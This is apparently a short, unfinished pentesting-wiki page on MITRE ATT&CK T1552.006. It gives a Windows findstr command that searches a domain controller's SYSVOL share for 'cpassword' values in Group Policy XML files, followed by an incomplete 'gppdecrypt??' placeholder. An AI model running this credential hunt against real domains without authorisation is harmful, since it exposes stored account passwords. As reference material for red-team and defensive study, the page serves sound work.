---
description: MITRE ATT&CK™ Sub-technique T1552.006
---

# 🛠️ Group Policies \(Domain Controller's SYSVOL\)

{% tabs %}
{% tab title="Windows" %}
```text
findstr /S cpassword \\domain_controller\sysvol\*.xml

gppdecrypt??
```
{% endtab %}
{% endtabs %}

